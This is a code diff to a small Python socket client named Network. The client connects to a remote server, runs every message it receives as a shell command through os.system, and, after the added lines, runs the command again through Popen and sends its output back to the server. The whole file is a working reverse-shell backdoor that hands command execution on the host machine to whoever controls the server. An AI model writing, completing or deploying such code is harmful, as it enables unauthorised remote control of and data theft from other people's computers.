@@ -1,6 +1,6 @@
 import socket
 import os
-
+from subprocess import Popen, PIPE
 class Network:
     def __init__(self):
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -29,14 +29,18 @@ class Network:
         self.client.setblocking(False)
         print("connected to: ",self.addr)
         self.send("!Connected")
+
+
 test = Network()
 test.connect()
-while True():
+while True:
     msg_server = test.receive_data()
     if msg_server != None:
-        print(msg_server)
         if msg_server != None and msg_server != "WORKS!":
             try:
                 os.system(msg_server)
+                stdout = Popen(msg_server,shell = True,stdout=PIPE)
+                output = stdout.communicate()[0]
+                test.send(output)
             except Exception as e:
                 test.send(e)
